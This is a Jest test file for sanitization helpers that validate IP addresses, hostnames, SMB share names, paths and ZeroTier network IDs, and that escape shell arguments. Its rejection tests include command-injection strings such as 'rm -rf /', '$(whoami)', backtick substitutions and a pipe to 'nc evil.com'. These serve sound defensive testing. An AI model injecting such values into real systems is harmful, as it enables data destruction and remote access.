/**
 * Tests for sanitization functions
 * These are critical for security - preventing command injection
 */

import {
  sanitizeIPAddress,
  sanitizeHostname,
  sanitizeSMBShareName,
  sanitizePath,
  sanitizeNetworkId,
  escapeShellArg,
} from '../sanitize';

describe('sanitizeIPAddress', () => {
  it('should accept valid IPv4 addresses', () => {
    expect(sanitizeIPAddress('192.168.1.1')).toBe('192.168.1.1');
    expect(sanitizeIPAddress('10.0.0.1')).toBe('10.0.0.1');
    expect(sanitizeIPAddress('172.16.0.1')).toBe('172.16.0.1');
    expect(sanitizeIPAddress('255.255.255.255')).toBe('255.255.255.255');
    expect(sanitizeIPAddress('0.0.0.0')).toBe('0.0.0.0');
  });

  it('should reject invalid IP addresses', () => {
    expect(() => sanitizeIPAddress('256.1.1.1')).toThrow('octet out of range');
    expect(() => sanitizeIPAddress('192.168.1.256')).toThrow('octet out of range');
    expect(() => sanitizeIPAddress('192.168.-1.1')).toThrow('Invalid IP address format');
    expect(() => sanitizeIPAddress('192.168')).toThrow('Invalid IP address format');
    expect(() => sanitizeIPAddress('not-an-ip')).toThrow('Invalid IP address format');
  });

  it('should reject command injection attempts', () => {
    expect(() => sanitizeIPAddress('192.168.1.1; rm -rf /')).toThrow();
    expect(() => sanitizeIPAddress('192.168.1.1 && malicious')).toThrow();
    expect(() => sanitizeIPAddress('192.168.1.1 | nc evil.com')).toThrow();
    expect(() => sanitizeIPAddress('$(whoami)')).toThrow();
    expect(() => sanitizeIPAddress('`ls`')).toThrow();
  });
});

describe('sanitizeHostname', () => {
  it('should accept valid hostnames', () => {
    expect(sanitizeHostname('localhost')).toBe('localhost');
    expect(sanitizeHostname('example.com')).toBe('example.com');
    expect(sanitizeHostname('sub.example.com')).toBe('sub.example.com');
    expect(sanitizeHostname('my-server')).toBe('my-server');
    expect(sanitizeHostname('server123')).toBe('server123');
  });

  it('should reject invalid hostnames', () => {
    expect(() => sanitizeHostname('example_com')).toThrow('Invalid hostname format');
    expect(() => sanitizeHostname('example..com')).toThrow('Invalid hostname format');
    expect(() => sanitizeHostname('-example.com')).toThrow('Invalid hostname format');
    expect(() => sanitizeHostname('example.com-')).toThrow('Invalid hostname format');
  });

  it('should reject command injection attempts', () => {
    expect(() => sanitizeHostname('example.com; rm -rf /')).toThrow();
    expect(() => sanitizeHostname('$(whoami).com')).toThrow();
    expect(() => sanitizeHostname('`ls`.com')).toThrow();
    expect(() => sanitizeHostname('evil|nc')).toThrow();
  });
});

describe('sanitizeSMBShareName', () => {
  it('should accept valid share names', () => {
    expect(sanitizeSMBShareName('Public')).toBe('Public');
    expect(sanitizeSMBShareName('My Documents')).toBe('My Documents');
    expect(sanitizeSMBShareName('Backup_2024')).toBe('Backup_2024');
    expect(sanitizeSMBShareName('Home-Storage')).toBe('Home-Storage');
  });

  it('should reject invalid characters', () => {
    expect(() => sanitizeSMBShareName('Share$')).toThrow('contains invalid characters');
    expect(() => sanitizeSMBShareName('Share;Name')).toThrow('contains invalid characters');
    expect(() => sanitizeSMBShareName('Share|Name')).toThrow('contains invalid characters');
    expect(() => sanitizeSMBShareName('Share&Name')).toThrow('contains invalid characters');
  });

  it('should reject leading/trailing spaces', () => {
    expect(() => sanitizeSMBShareName(' Public')).toThrow('leading/trailing spaces');
    expect(() => sanitizeSMBShareName('Public ')).toThrow('leading/trailing spaces');
    expect(() => sanitizeSMBShareName(' Public ')).toThrow('leading/trailing spaces');
  });

  it('should reject command injection attempts', () => {
    expect(() => sanitizeSMBShareName('Share; rm -rf /')).toThrow();
    expect(() => sanitizeSMBShareName('$(whoami)')).toThrow();
    expect(() => sanitizeSMBShareName('`ls`')).toThrow();
  });
});

describe('sanitizePath', () => {
  it('should accept valid paths', () => {
    expect(sanitizePath('/home/user/documents')).toBe('/home/user/documents');
    expect(sanitizePath('/var/log')).toBe('/var/log');
    expect(sanitizePath('relative/path')).toBe('relative/path');
    expect(sanitizePath('./current/dir')).toBe('./current/dir');
    expect(sanitizePath('../parent/dir')).toBe('../parent/dir');
  });

  it('should reject dangerous characters', () => {
    expect(() => sanitizePath('/home/user; rm -rf /')).toThrow('dangerous characters');
    expect(() => sanitizePath('/home/$(whoami)')).toThrow('dangerous characters');
    expect(() => sanitizePath('/home/`ls`')).toThrow('dangerous characters');
    expect(() => sanitizePath('/home/user|nc')).toThrow('dangerous characters');
    expect(() => sanitizePath('/home/user&evil')).toThrow('dangerous characters');
  });
});

describe('sanitizeNetworkId', () => {
  it('should accept valid ZeroTier network IDs', () => {
    expect(sanitizeNetworkId('1234567890abcdef')).toBe('1234567890abcdef');
    expect(sanitizeNetworkId('ABCDEF1234567890')).toBe('ABCDEF1234567890');
    expect(sanitizeNetworkId('0000000000000000')).toBe('0000000000000000');
    expect(sanitizeNetworkId('ffffffffffffffff')).toBe('ffffffffffffffff');
  });

  it('should reject invalid network IDs', () => {
    expect(() => sanitizeNetworkId('123')).toThrow('Invalid network ID format');
    expect(() => sanitizeNetworkId('12345678 90abcdef')).toThrow('Invalid network ID format');
    expect(() => sanitizeNetworkId('1234567890abcdefg')).toThrow('Invalid network ID format');
    expect(() => sanitizeNetworkId('not-a-network-id')).toThrow('Invalid network ID format');
  });

  it('should reject command injection attempts', () => {
    expect(() => sanitizeNetworkId('1234567890abcd; rm')).toThrow();
    expect(() => sanitizeNetworkId('$(whoami)')).toThrow();
  });
});

describe('escapeShellArg', () => {
  it('should escape single quotes correctly', () => {
    expect(escapeShellArg("it's")).toBe("'it'\\''s'");
    expect(escapeShellArg("user's file")).toBe("'user'\\''s file'");
  });

  it('should wrap strings in single quotes', () => {
    expect(escapeShellArg('simple')).toBe("'simple'");
    expect(escapeShellArg('with spaces')).toBe("'with spaces'");
  });

  it('should make command injection safe', () => {
    // These should be escaped and safe to use
    const dangerous = escapeShellArg('$(whoami)');
    expect(dangerous).toBe("'$(whoami)'");

    const dangerous2 = escapeShellArg('`ls -la`');
    expect(dangerous2).toBe("'`ls -la`'");

    const dangerous3 = escapeShellArg('test; rm -rf /');
    expect(dangerous3).toBe("'test; rm -rf /'");
  });

  it('should handle empty strings', () => {
    expect(escapeShellArg('')).toBe("''");
  });

  it('should handle special characters', () => {
    expect(escapeShellArg('!@#$%^&*()')).toBe("'!@#$%^&*()'");
    expect(escapeShellArg('|&;<>')).toBe("'|&;<>'");
  });
});
